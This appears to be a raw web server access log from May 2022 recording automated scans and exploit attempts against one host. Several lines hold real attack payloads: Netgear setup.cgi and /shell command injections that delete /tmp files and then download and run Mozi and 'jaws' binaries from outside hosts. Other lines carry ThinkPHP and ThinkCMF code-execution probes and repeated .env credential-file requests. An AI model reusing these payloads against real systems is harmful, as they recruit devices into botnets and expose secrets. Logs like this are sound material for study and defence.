51.79.29.48 - - [10/May/2022:14:48:42 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.107.61.179 - - [10/May/2022:14:53:58 +0000] "\x16\x03\x01" 400 488 "-" "-"
34.107.61.179 - - [10/May/2022:14:54:03 +0000] "OPTIONS / HTTP/1.0" 500 803 "-" "-"
78.187.20.58 - - [10/May/2022:16:05:40 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
192.241.214.10 - - [10/May/2022:16:08:20 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
41.60.216.245 - - [10/May/2022:16:35:03 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.61.188.169 - - [10/May/2022:16:44:01 +0000] "GET /config/getuser?index=0 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
117.50.8.86 - - [10/May/2022:16:47:06 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0"
192.53.170.163 - - [10/May/2022:17:11:12 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
35.187.132.4 - - [10/May/2022:17:13:23 +0000] "HEAD / HTTP/1.1" 500 171 "-" "AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)"
162.247.74.217 - - [10/May/2022:17:13:23 +0000] "GET / HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
52.7.99.72 - - [10/May/2022:17:13:25 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43"
35.187.132.4 - - [10/May/2022:17:13:27 +0000] "GET / HTTP/1.1" 500 803 "http://174.138.17.206" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 AppEngine-Google; (+http://code.google.com/appengine; appid: s~virustotalcloud)"
51.79.29.48 - - [10/May/2022:17:20:47 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [10/May/2022:17:20:48 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:17:53:19 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:17:53:19 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.95.49.69 - - [10/May/2022:17:59:08 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.95.49.69 - - [10/May/2022:17:59:09 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.169.39.32 - - [10/May/2022:18:14:37 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36"
34.213.46.251 - - [10/May/2022:18:18:47 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"
54.202.252.127 - - [10/May/2022:18:19:21 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"
207.102.138.19 - - [10/May/2022:18:26:41 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
139.162.167.216 - - [10/May/2022:18:32:46 +0000] "\x16\x03" 400 488 "-" "-"
139.162.167.216 - - [10/May/2022:18:32:47 +0000] "GET /efFK HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
139.162.167.216 - - [10/May/2022:18:32:47 +0000] "GET /XNbU HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
20.55.53.144 - - [10/May/2022:18:39:32 +0000] "GET /tXJD9KArSv3ImslyViGCq7dYghD HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
45.61.185.198 - - [10/May/2022:19:29:05 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
34.140.248.32 - - [10/May/2022:20:28:46 +0000] "GET / HTTP/1.1" 500 803 "-" "python-requests/2.27.1"
205.169.39.100 - - [10/May/2022:20:48:32 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
185.254.196.223 - - [10/May/2022:20:52:27 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:20:52:28 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
137.184.140.204 - - [10/May/2022:21:25:09 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36"
109.237.103.38 - - [10/May/2022:22:26:59 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.38 - - [10/May/2022:22:26:59 +0000] "\x16\x03\x01\x01C\x01" 400 488 "-" "-"
177.124.27.46 - - [10/May/2022:22:27:33 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
20.55.53.144 - - [10/May/2022:23:46:54 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
185.254.196.223 - - [10/May/2022:23:53:38 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [10/May/2022:23:53:40 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:00:18:31 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:00:18:33 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.206.199 - - [11/May/2022:01:06:44 +0000] "MGLNDD_174.138.17.206_80\n" 400 488 "-" "-"
45.190.159.1 - - [11/May/2022:01:10:18 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
128.1.248.26 - - [11/May/2022:01:46:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.21.216.183 - - [11/May/2022:01:47:28 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
172.104.138.223 - - [11/May/2022:01:52:31 +0000] "GET /fuN3 HTTP/1.0" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
51.79.29.48 - - [11/May/2022:02:19:59 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:02:20:00 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:02:52:11 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:02:52:11 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
182.117.27.50 - - [11/May/2022:03:14:17 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.117.27.50:35956/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
193.56.29.198 - - [11/May/2022:03:24:31 +0000] "GET / HTTP/1.0" 500 803 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
115.49.30.113 - - [11/May/2022:03:51:49 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.49.30.113:38538/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
23.251.102.74 - - [11/May/2022:04:05:24 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
51.79.29.48 - - [11/May/2022:04:17:23 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:04:17:24 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.68.211.3 - - [11/May/2022:04:47:44 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
101.68.211.3 - - [11/May/2022:04:47:44 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
101.68.211.3 - - [11/May/2022:04:47:44 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
101.68.211.3 - - [11/May/2022:04:47:45 +0000] "GET /robots.txt HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.61.188.169 - - [11/May/2022:05:49:33 +0000] "GET /config/getuser?index=0 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.254.196.223 - - [11/May/2022:05:52:45 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:05:52:45 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.159.11.18 - - [11/May/2022:06:01:47 +0000] "GET /api.php?key=1&apikey=1 HTTP/1.1" 500 803 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
51.79.29.48 - - [11/May/2022:06:13:08 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:06:13:08 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.206.128.50 - - [11/May/2022:06:34:48 +0000] "GET / HTTP/1.1" 500 803 "-" "https://gdnplus.com:Gather Analyze Provide."
185.189.182.234 - - [11/May/2022:06:41:06 +0000] "GET / HTTP/1.1" 400 488 "-" "-"
52.173.31.82 - - [11/May/2022:07:42:41 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
157.245.70.127 - - [11/May/2022:07:43:02 +0000] "GET /ab2g HTTP/1.1" 400 488 "-" "-"
157.245.70.127 - - [11/May/2022:07:43:02 +0000] "GET /ab2h HTTP/1.1" 400 488 "-" "-"
45.9.20.101 - - [11/May/2022:08:04:04 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.79.29.48 - - [11/May/2022:08:08:19 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:08:08:19 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.88.26.222 - - [11/May/2022:08:35:51 +0000] "\x16\x03\x01" 400 488 "-" "-"
154.88.26.222 - - [11/May/2022:08:36:02 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
154.88.26.222 - - [11/May/2022:08:36:03 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
154.88.26.222 - - [11/May/2022:08:36:04 +0000] "GET /robots.txt HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
154.88.26.222 - - [11/May/2022:08:36:07 +0000] "GET /sitemap.xml HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
178.69.146.5 - - [11/May/2022:08:43:22 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.254.196.223 - - [11/May/2022:08:53:24 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:08:53:24 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.159.4.33 - - [11/May/2022:08:56:56 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.83.67.135 - - [11/May/2022:09:08:15 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36"
45.9.20.101 - - [11/May/2022:09:16:16 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
117.50.7.159 - - [11/May/2022:09:41:27 +0000] "GET / HTTP/1.0" 500 803 "-" "-"
94.102.61.10 - - [11/May/2022:09:45:05 +0000] "GET / HTTP/1.1" 500 803 "-" "python-requests/2.26.0"
51.79.29.48 - - [11/May/2022:10:02:15 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:10:02:16 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
139.162.145.250 - - [11/May/2022:10:02:24 +0000] "\x16\x03\x01" 400 488 "-" "-"
45.9.20.101 - - [11/May/2022:10:04:24 +0000] "GET /console/ HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.84.136.188 - - [11/May/2022:10:04:59 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
64.62.197.182 - - [11/May/2022:10:30:39 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
45.9.20.101 - - [11/May/2022:11:21:52 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.137.36.6 - - [11/May/2022:11:28:04 +0000] "GET / HTTP/1.0" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:37:45 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:37:45 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:45:21 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:45:22 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:50:52 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:50:52 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
185.254.196.223 - - [11/May/2022:11:53:25 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/May/2022:11:53:27 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:53:43 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:53:43 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:54:15 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:11:54:16 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
51.79.29.48 - - [11/May/2022:11:55:25 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:11:55:26 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.32.156.254 - - [11/May/2022:11:57:39 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.32.156.254 - - [11/May/2022:11:57:39 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [11/May/2022:12:05:20 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:10:08 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:10:09 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:11:30 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:11:31 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:18:15 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:18:17 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:22:14 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:22:16 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:23:26 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
119.18.1.27 - - [11/May/2022:12:23:26 +0000] "GET /favicon.ico HTTP/1.1" 500 803 "http://174.138.17.206/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
45.9.20.101 - - [11/May/2022:12:28:33 +0000] "GET /actuator/gateway/routes HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.35.105.132 - - [11/May/2022:12:36:28 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.35.105.132 - - [11/May/2022:12:36:28 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
38.70.11.67 - - [11/May/2022:12:53:33 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
38.70.11.67 - - [11/May/2022:12:53:34 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
197.62.203.189 - - [11/May/2022:13:32:42 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 500 798 "-" "Hello, world"
51.79.29.48 - - [11/May/2022:13:51:35 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [11/May/2022:13:51:35 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.9.20.101 - - [11/May/2022:13:51:41 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
